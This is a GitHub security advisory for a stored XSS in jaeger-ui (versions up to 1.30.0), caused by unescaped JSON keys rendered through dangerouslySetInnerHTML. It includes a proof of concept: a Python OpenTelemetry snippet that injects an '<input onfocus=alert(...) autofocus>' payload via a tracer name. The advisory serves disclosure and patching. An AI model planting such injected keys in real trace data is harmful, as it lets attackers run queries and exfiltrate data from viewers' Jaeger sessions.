# A stored XSS in jaeger UI might allow an attacker who controls a trace to perform arbitrary jaeger queries

Moderate

[yurishkuro](/yurishkuro)
published
GHSA-vv24-rm95-q56r
Jul 11, 2023

## Package

jaeger-ui

## Affected versions

<= 1.30.0

## Patched versions

1.31.0

## Description

### Summary

There is a stored XSS when viewing trace details. The XSS happens while rendering key-value tables in jaeger UI using the KeyValuesTable component.

### Details

The offending component is the KeyValuesTable.tsx (<https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L64>), which uses the dangerouslySetInnerHTML function to render html markup generated by 'json-markup' package from the input values that are potentially controllable by an attacker.

The json-markup package (<https://github.com/mafintosh/json-markup/blob/master/index.js#L88>) does not properly sanitize keys in json objects.

### PoC

In order to reproduce, perform the following steps:

1. start a new instance of jaeger (I used the latest all-in-one docker image):

```
docker run -d --name jaeger \
  -e COLLECTOR_ZIPKIN_HOST_PORT=:9411 \
  -e COLLECTOR_OTLP_ENABLED=true \
  -p 6831:6831/udp \
  -p 6832:6832/udp \
  -p 5778:5778 \
  -p 16686:16686 \
  -p 4317:4317 \
  -p 4318:4318 \
  -p 14250:14250 \
  -p 14268:14268 \
  -p 14269:14269 \
  -p 9411:9411 \
  jaegertracing/all-in-one:1.46

```

2. Use the following python snippet to generate the trace that exploits the XSS:

```
from opentelemetry import trace
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor
from opentelemetry.exporter.otlp.proto.grpc.trace_exporter import OTLPSpanExporter
from opentelemetry.sdk.resources import SERVICE_NAME, Resource

import grpc

resource = Resource(attributes={
    SERVICE_NAME: "solidlab"
})

provider = TracerProvider(resource=resource)
otlp_exporter = OTLPSpanExporter(endpoint="http://localhost:4317")
processor = BatchSpanProcessor(otlp_exporter)
provider.add_span_processor(processor)
trace.set_tracer_provider(provider)

tracer = trace.get_tracer("{\"<input onfocus=alert(document.domain) autofocus>\":\"solidlab.tracer\"}")
with tracer.start_as_current_span("test_span") as span:
    span.set_attribute('test_attr', 'test_val')

```

3. In the jaeger UI on <http://localhost:16686/>, select the 'solidlab' service, select the only trace present, open the span and expand the tags section. An alert box will pop up :

   [![xss-result](https://user-images.githubusercontent.com/78071/245375884-32603a73-e9d8-4c60-a1d0-0f4f32710d55.png)](https://user-images.githubusercontent.com/78071/245375884-32603a73-e9d8-4c60-a1d0-0f4f32710d55.png)

### Impact

If an attacker controls the "key" part of a key-value pair (in a tag/logs/process), he can inject a js payload that will be executed once the offending trace is viewed and the corresponding section (tags/process/logs) is opened. Using an xss, an attacker would be able to perform arbitrary jaeger queries and exfiltrate returned data.

### Mitigation

Patch json-markup library to properly sanitize object keys.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

The json-markup library does not properly escape the keys. Not clear if it is maintained or not, last changes were several years ago. Since it's just a single file, copy it directly and fix in place:

* escape keys
* parse URL and use safe href property in `<a href="...">`
* remove handling of `date` type which will never be in the JSON that we obtain from span tags via JSON.parse()
* remove skinning ability since we explicitly define css

Add tests:

* use Jest snapshot to validate that the JSON is escaped correctly, which was not tested by the previous code
* use more complex JSON with different unsafe values and exercising all code paths of the ported code

Sorry, something went wrong.
